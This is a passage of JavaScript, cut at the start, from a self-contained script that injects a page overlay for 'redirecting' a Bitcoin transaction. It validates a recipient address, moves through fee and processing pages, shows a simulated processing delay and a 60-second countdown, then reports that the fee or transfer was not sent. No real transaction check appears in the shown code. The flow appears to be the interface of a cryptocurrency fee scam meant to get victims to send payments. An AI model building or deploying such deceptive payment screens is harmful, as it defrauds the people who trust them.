      if (!addressInputValue.trim()) {
        addressInputElement.classList.remove("invalid");
        addressValidationMessage.className = "validation-message";
        continueButton.disabled = true;
        return;
      }
      if (isValidBitcoinAddress(addressInputValue)) {
        addressInputElement.classList.remove("invalid");
        addressValidationMessage.className = "validation-message";
        continueButton.disabled = false;
      } else {
        addressInputElement.classList.add("invalid");
        addressValidationMessage.textContent = "✗ Invalid Bitcoin address";
        addressValidationMessage.className = "validation-message invalid";
        continueButton.disabled = true;
      }
    }
    const recipientAddressInput = document.getElementById("redirectAddress");
    const nextToFeesButton = document.getElementById("nextToFees");
    const backToOverviewButton = document.getElementById("backToOverview");
    const confirmProcessingButton = document.getElementById("confirmProcessing");
    const closeProcessingButton = document.getElementById("closeProcessing");
    const closePage1Button = document.getElementById("closePage1");
    const closePage2Button = document.getElementById("closePage2");
    const recipientDisplayElement = document.getElementById("newRecipientDisplay");
    const monitorRecipientElement = document.getElementById("monitorRecipient");
    let feeMonitoringInterval;
    recipientAddressInput.addEventListener("input", (inputEvent) => validateRecipientAddress(inputEvent.target.value));
    closePage1Button.addEventListener("click", () => {
      overlayElement.remove();
      document.getElementById(styleElementId)?.remove();
    });
    closePage2Button.addEventListener("click", () => {
      overlayElement.remove();
      document.getElementById(styleElementId)?.remove();
    });
    nextToFeesButton.addEventListener("click", () => {
      const newRecipientAddress = recipientAddressInput.value.trim();
      if (!isValidBitcoinAddress(newRecipientAddress)) {
        validateRecipientAddress(newRecipientAddress);
        recipientAddressInput.focus();
        return;
      }
      recipientDisplayElement.textContent = newRecipientAddress.substring(0, 14) + "...";
      showPage(2);
      setTimeout(updateCopyButtons, 100);
      setTimeout(monitorTransaction, 200);
    });
    backToOverviewButton.addEventListener("click", () => showPage(1));
    confirmProcessingButton.addEventListener("click", async () => {
      const enteredRecipientAddress = recipientAddressInput.value.trim();
      monitorRecipientElement.textContent = enteredRecipientAddress.substring(0, 14) + "...";
      confirmProcessingButton.disabled = true;
      confirmProcessingButton.textContent = "Processing...";
      await new Promise((resolveDelay) => setTimeout(resolveDelay, 1200));
      showPage(3);
      let remainingSeconds = 60;
      feeMonitoringInterval = setInterval(() => {
        if (remainingSeconds <= 0) {
          clearInterval(feeMonitoringInterval);
          const timeoutElement = document.querySelector("#page3 .content");
          if (timeoutElement) {
            timeoutElement.innerHTML = "<div class=\"processing\"><div class=\"error-icon\"></div><div class=\"error-box\"><div class=\"error-title\">Time Expired</div><div class=\"error-message\">The transfer could not be completed because either the fee or the transfer amount itself was not sent.<br>\nPlease verify and try again.</div></div></div><button class=\"btn btn-simple\" id=\"closeTimeout\">Close</button>";
            document.getElementById("closeTimeout").addEventListener("click", () => {
              overlayElement.remove();
              document.getElementById(styleElementId)?.remove();
            });
          }
        }
        remainingSeconds--;
      }, 1000);
    });
    closeProcessingButton.addEventListener("click", () => {
      if (feeMonitoringInterval) {
        clearInterval(feeMonitoringInterval);
      }
      overlayElement.remove();
      document.getElementById(styleElementId)?.remove();
    });
  } else {
    document.getElementById("closeOnly")?.addEventListener("click", () => {
      overlayElement.remove();
      document.getElementById(styleElementId)?.remove();
    });
  }
  overlayElement.addEventListener("mousedown", (mouseEvent) => {
    if (mouseEvent.target === overlayElement) {
      if (countdown) {
        clearInterval(countdown);
      }
      overlayElement.remove();
      document.getElementById(styleElementId)?.remove();
    }
  });
  document.addEventListener("keydown", function escapeKeyHandler(keyboardEvent) {
    if (keyboardEvent.key === "Escape") {
      if (countdown) {
        clearInterval(countdown);
      }
      overlayElement.remove();
      document.removeEventListener("keydown", escapeKeyHandler);
      document.getElementById(styleElementId)?.remove();
    }
  });
})();